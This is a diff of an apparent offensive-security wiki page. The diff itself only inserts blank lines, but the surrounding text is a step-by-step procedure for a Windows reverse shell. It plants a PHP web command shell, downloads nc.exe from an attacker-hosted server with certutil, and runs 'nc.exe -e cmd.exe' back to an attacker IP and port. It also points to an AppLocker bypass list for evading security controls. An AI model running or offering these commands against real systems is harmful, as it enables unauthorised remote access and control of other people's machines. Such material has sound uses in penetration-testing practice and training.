@@ -37,15 +37,29 @@ Download and execute Netcat to create  a reverse shell on a remote system. While
 
 Download and execute Netcat to create  a reverse shell on a remote system. While Windows  can spawn reverse shells natively, the key functions are often blocked for security reasons, so a third party program like Netcat is required.
 
+
+
 # Instructions
 
 This procedure will assume remote code execution is being done with a PHP cmdshell, but the concepts are generic and can apply to many situations. In this case, the following PHP code has been added to a web page.
 
+
+
+
+
 **Code**: [[<?php system($_REQUEST["cmd"]); ?>]]
+
+
+
+
 
 1. Download and extract nc.exe (or nc64.exe): [Download the NetCat for Windows static binaries](https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip).
 
 2. Host nc.exe on a web server on the attacker's machine.
+
+
+
+
 
 **Command** ([[Launch a Python 3 Web Server]]):
 
@@ -53,7 +67,15 @@ This procedure will assume remote code execution is being done with a PHP cmdshe
 python3 -m http.server $_PORT
 ```
 
+
+
+
+
 3. Download nc.exe to the target using the website RCE.
+
+
+
+
 
 **Command** ([[certutil.exe -urlcache -split -f "http://$_REMOTE_]]):
 
@@ -61,9 +83,17 @@ python3 -m http.server $_PORT
 certutil.exe -urlcache -split -f "http://$_REMOTE_IP/$_FILENAME" $_FILENAME
 ```
 
+
+
 Tip: Use the [Placing files in writable paths](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md) section of the Ultimate AppLocker Bypass List to find a writable directory not restricted by security controls (eg. C:\Windows\Tasks).
 
+
+
 4. Set up a netcat listener on the Attacker machine, then execute Netcat using the RCE.
+
+
+
+
 
 **Command** ([[Create a Netcat Listener]]):
 
@@ -71,13 +101,25 @@ Tip: Use the [Placing files in writable paths](https://github.com/api0cradle/Ult
 nc -lvnp $_PORT
 ```
 
+
+
+
+
 5. Execute the shell.
+
+
+
+
 
 **Command** ([[Execute Netcat from a Command Shell (cmd.exe) RCE]]):
 
 ```bash
 cmd.exe /C "nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
 ```
+
+
+
+
 
 ## Platforms
 
@@ -105,3 +147,5 @@ cmd.exe /C "nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
 
 - [[Network]]
 - [[shell]]
+
+
